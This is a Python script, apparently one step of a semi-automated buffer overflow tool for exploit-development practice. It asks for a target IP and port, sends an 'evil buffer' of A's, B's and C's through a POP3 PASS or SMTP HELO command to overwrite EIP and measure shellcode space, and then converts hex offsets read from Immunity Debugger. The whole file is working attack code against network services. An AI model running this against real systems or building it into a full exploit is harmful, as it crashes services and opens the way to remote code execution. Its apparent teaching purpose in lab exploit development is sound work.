#!/usr/bin/python3.6
null    = """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""

import socket

print("The purpose of this step is to find out how much space you have for shellcode")
ipaddr  = input("What is the ip of the machine you are trying to find the shellcode space of?\n> ")
portnum = input("What is the port number of the application you are trying to find the shellcode space of?\n> ")
portnum = int(portnum)
bytes   = input("How many bytes (letters) would you like to send (verified in step 2)?\n> ")
bytes   = int(bytes)
location        = input("Where was the crash location (verified in step 4)?\n> ")
location        = int(location)
addition	= input("""How much more room do you want to try adding for shellcode?

Hint...
You will need around 400 bytes to drop your shellcode.
(You can use a huge number. I'd recommend 1000 to start)
""")
addition	= int(addition)
s       = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
difference      = bytes - location
shellcodespace	= difference + addition
buffer  = "A" * location + "B" * 4 + "C" * shellcodespace
service_greeting        = "PASS "
if portnum      == 25:
	service_greeting        = "HELO "
elif portnum    == 110:
	service_greeting        = "PASS "

try:
	print("\nSending evil buffer...")
	s.connect((ipaddr, portnum))
	data = s.recv(1024)
	a       = "USER username" + "\r\n"
	s.send(a.encode())
	data = s.recv(1024)
	b       = service_greeting + buffer +"\r\n"
	s.send(b.encode())
	print("\nDone! EIP should now be overwritten with 42424242")
except:
	print("Could not connect to POP3!")

print("""
Now check out the bottom right window in Immunity
(you may have to double click the the left collum in that pane to get the count$
select where the C's start and note where it ends""")

while True:
	hexstring	= input("Now give me the value of the last full group of C's or any other hex decimal you'd like to convert.\n> ")
	decivalue	= int(hexstring, 16)
	print("{} bytes of space (for your shellcode)".format(decivalue))
	print("Make sure to annotate the overall shellcode space")
	answer	= input("Would you like to do more conversions? (y/n) \n> ")
	if answer	== "y":
		continue
	else:
		break
